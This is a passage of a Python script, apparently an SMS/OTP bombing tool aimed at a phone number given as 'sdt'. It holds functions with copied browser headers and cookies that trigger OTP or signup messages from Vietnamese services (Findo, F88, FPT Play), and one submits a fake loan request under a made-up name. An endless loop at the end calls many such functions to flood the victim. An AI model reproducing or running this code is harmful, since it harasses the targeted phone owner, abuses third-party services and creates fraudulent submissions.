	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mGhn\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def findo():
	headers = {
		'authority': 'api.findo.vn',
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json;charset=UTF-8',
		'origin': 'https://www.findo.vn',
		'referer': 'https://www.findo.vn/',
		'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-site',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
	}

	json_data = {
		'mobilePhone': {
			'number': sdt,
		},
	}

	response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, json=json_data)
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mFindo\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def f88():
	cookies = {
		'__zi': '2000.SSZzejyD7ePpnEtqnGzAc3tAzRQP7K26BuZde8iI7euemQgWYXKMXIh6xwY865A1AiRbhOqML88.1',
		'_gcl_au': '1.1.1155587199.1698569073',
		'_tt_enable_cookie': '1',
		'_ttp': 'Li5zDzrAL7bPVCau6NpMrimYOau',
		'_fbp': 'fb.1.1698569075797.738720372',
		'_gid': 'GA1.2.1579245555.1699008758',
		'_gcl_aw': 'GCL.1699008830.Cj0KCQjwtJKqBhCaARIsAN_yS_nngoSOeLf4eSgaLFzOOGA5icZDu2VR0wlg11iM0MLNlDhEyanqBnAaAqPOEALw_wcB',
		'_gac_UA-93343505-1': '1.1699008831.Cj0KCQjwtJKqBhCaARIsAN_yS_nngoSOeLf4eSgaLFzOOGA5icZDu2VR0wlg11iM0MLNlDhEyanqBnAaAqPOEALw_wcB',
		'_ga_6VBREQRSED': 'GS1.1.1699008757.4.1.1699008831.49.0.0',
		'_ga': 'GA1.1.1921149661.1698569075',
		'cto_bundle': '1ixSB19CWWdoc0tSU3g0JTJGTk5MNm5KbnpyY1pPMG9qWjh3WEZVODFFTnh5V1JGV1BiM1ZkYSUyQklGRERHMTRlcndKMHo5NlJhNVdtRHJQQUtreiUyRkZCYklQTjUwVCUyRkg2MVJpR2FJQVJkWFM5VzJvUGJxWEJoVm9tJTJGMEdMTnNaJTJGaVY4YjJVaw',
	}

	headers = {
		'authority': 'f88.vn',
		'accept': 'application/json, text/javascript, */*; q=0.01',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json',
		# 'cookie': '__zi=2000.SSZzejyD7ePpnEtqnGzAc3tAzRQP7K26BuZde8iI7euemQgWYXKMXIh6xwY865A1AiRbhOqML88.1; _gcl_au=1.1.1155587199.1698569073; _tt_enable_cookie=1; _ttp=Li5zDzrAL7bPVCau6NpMrimYOau; _fbp=fb.1.1698569075797.738720372; _gid=GA1.2.1579245555.1699008758; _gcl_aw=GCL.1699008830.Cj0KCQjwtJKqBhCaARIsAN_yS_nngoSOeLf4eSgaLFzOOGA5icZDu2VR0wlg11iM0MLNlDhEyanqBnAaAqPOEALw_wcB; _gac_UA-93343505-1=1.1699008831.Cj0KCQjwtJKqBhCaARIsAN_yS_nngoSOeLf4eSgaLFzOOGA5icZDu2VR0wlg11iM0MLNlDhEyanqBnAaAqPOEALw_wcB; _ga_6VBREQRSED=GS1.1.1699008757.4.1.1699008831.49.0.0; _ga=GA1.1.1921149661.1698569075; cto_bundle=1ixSB19CWWdoc0tSU3g0JTJGTk5MNm5KbnpyY1pPMG9qWjh3WEZVODFFTnh5V1JGV1BiM1ZkYSUyQklGRERHMTRlcndKMHo5NlJhNVdtRHJQQUtreiUyRkZCYklQTjUwVCUyRkg2MVJpR2FJQVJkWFM5VzJvUGJxWEJoVm9tJTJGMEdMTnNaJTJGaVY4YjJVaw',
		'origin': 'https://f88.vn',
		'referer': 'https://f88.vn/vay-tien-dang-ky-xe?utm_source=google.pgd&utm_medium=cpc&utm_campaign=google.paid.p-max_acid-6998_VN&utm_campaignid=20429020527&utm_adgroupid=&gclid=Cj0KCQjwtJKqBhCaARIsAN_yS_nngoSOeLf4eSgaLFzOOGA5icZDu2VR0wlg11iM0MLNlDhEyanqBnAaAqPOEALw_wcB',
		'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
		'x-requested-with': 'XMLHttpRequest',
	}

	json_data = {
		'name': 'MAC GIA KHIEM',
		'phone': sdt,
		'Description': 'Giá trị muốn vay: undefined',
		'select2': '',
		'province': 'Hà Nội',
		'district': 'Ba Đình',
		'regionID': '243',
		'ReferenceType': '0',
		'CMND': '',
		'link': 'https://f88.vn/vay-tien-dang-ky-xe?utm_source=google.pgd&utm_medium=cpc&utm_campaign=google.paid.p-max_acid-6998_VN&utm_campaignid=20429020527&utm_adgroupid=&gclid=Cj0KCQjwtJKqBhCaARIsAN_yS_nngoSOeLf4eSgaLFzOOGA5icZDu2VR0wlg11iM0MLNlDhEyanqBnAaAqPOEALw_wcB',
		'select1': 'Đăng ký ô tô',
		'GoogleClickId': 'Cj0KCQjwtJKqBhCaARIsAN_yS_nngoSOeLf4eSgaLFzOOGA5icZDu2VR0wlg11iM0MLNlDhEyanqBnAaAqPOEALw_wcB',
		'regionId': '243',
	}

	response = requests.post('https://f88.vn/api/apilienket/ladipageApi', cookies=cookies, headers=headers, json=json_data).json()
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mFindo\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

def fpt():
	headers = {
		'authority': 'api.fptplay.net',
		'accept': 'application/json, text/plain, */*',
		'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
		'content-type': 'application/json; charset=UTF-8',
		'origin': 'https://fptplay.vn',
		'referer': 'https://fptplay.vn/',
		'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'cross-site',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
		'x-did': 'D4620DF43DD0D6A4',
	}

	json_data = {
		'phone': sdt,
		'country_code': 'VN',
		'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
	}

	response = requests.post(
		'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=QnKnMQau8-cU5GCvwTK4TQ&e=1699016844&device=Chrome(version%253A119.0.0.0)&drm=1',
		headers=headers,
		json=json_data,
	)
	print(f'\033[1;34m@SPAM_OTP\033[1;37m|\033[1;33mFPT\033[1;37m| \033[1;35m[\033[1;32m{sdt}\033[1;35m] \033[1;37m[\033[1;32mSuccess\033[1;37m]')

#RUN ALL API TẠI ĐÂY
t = 0
while True:
	t = t + 1
	tv360()
	fpt()
	sapo()
	best_inc()
	vayvnd()
	ghn()
	f88()
	myvt()
	findo()
	cashberry()
	mytv2()
	print(f'\033[1;31m --> ĐÃ CHẠY XONG LẦN \033[1;37m{t}')